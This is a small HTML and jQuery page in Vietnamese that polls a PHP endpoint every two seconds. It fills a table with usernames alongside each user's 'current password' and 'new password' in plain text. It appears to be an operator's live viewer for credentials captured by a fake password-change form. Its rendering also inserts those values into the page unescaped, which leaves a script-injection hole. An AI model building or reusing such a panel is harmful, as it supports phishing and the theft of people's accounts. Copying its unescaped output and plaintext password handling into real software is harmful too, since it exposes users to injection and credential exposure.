<!DOCTYPE html>
<html>
<head>
    <title>Xem dữ liệu</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
    <h2>Bảng dữ liệu người dùng</h2>
    <table border="1" cellpadding="5" id="dataTable">
        <thead>
            <tr>
                <th>STT</th>
                <th>Username</th>
                <th>Mật khẩu hiện tại</th>
                <th>Mật khẩu mới</th>
            </tr>
        </thead>
        <tbody>
            <!-- dữ liệu AJAX sẽ chèn vào đây -->
        </tbody>
    </table>

    <script>
        function loadData() {
            $.get("lay_dulieu.php", function(data) {
                let rows = "";
                let json = JSON.parse(data);
                json.forEach((item, index) => {
                    rows += `
                        <tr>
                            <td>${index + 1}</td>
                            <td>${item.username}</td>
                            <td>${item.password}</td>
                            <td>${item.new_password}</td>
                        </tr>
                    `;
                });
                $("#dataTable tbody").html(rows);
            });
        }

        // Tự động load khi mở trang
        loadData();
        // 2 giây load lại 1 lần
        setInterval(loadData, 2000);
    </script>
</body>
</html>
